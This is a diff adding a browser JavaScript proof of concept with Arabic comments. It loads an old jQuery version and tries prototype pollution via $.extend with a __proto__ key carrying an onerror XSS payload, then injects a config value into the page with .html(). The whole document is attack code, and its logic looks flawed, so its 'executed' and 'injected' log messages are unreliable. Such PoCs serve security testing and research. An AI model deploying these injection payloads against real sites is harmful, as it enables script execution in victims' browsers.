@@ -1,0 +1,32 @@
+const script = document.createElement('script');
+script.src = "https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js";
+document.head.appendChild(script);
+
+script.onload = function() {
+    console.log("[+] Vulnerable jQuery loaded!");
+
+    // 1. تنفيذ التلوث بالشكل الصحيح نحويّاً باستخدام $.extend
+    $.extend(true, {}, {
+        __proto__: {
+            backLink: "<img src=x onerror=alert(document.domain)>"
+        }
+    });
+
+    console.log("[+] Prototype Pollution executed via $.extend().");
+
+    // 2. إعداد العنصر واختبار سحب القيمة الملوثة
+    const defaultConfig = {
+        "backLink": "<a href='http://192.168.139.128:4444/'>Go Back</a>"
+    };
+
+    let config = $.extend(true, {}, defaultConfig);
+
+    const container = document.createElement('div');
+    container.id = 'backLinkContainer';
+    document.body.appendChild(container);
+
+    $('#backLinkContainer').html(config.backLink);
+    console.log("[+] Payload injected into the DOM.");
+};
+
+console.log("[*] Script injected. Waiting for jQuery to load...");
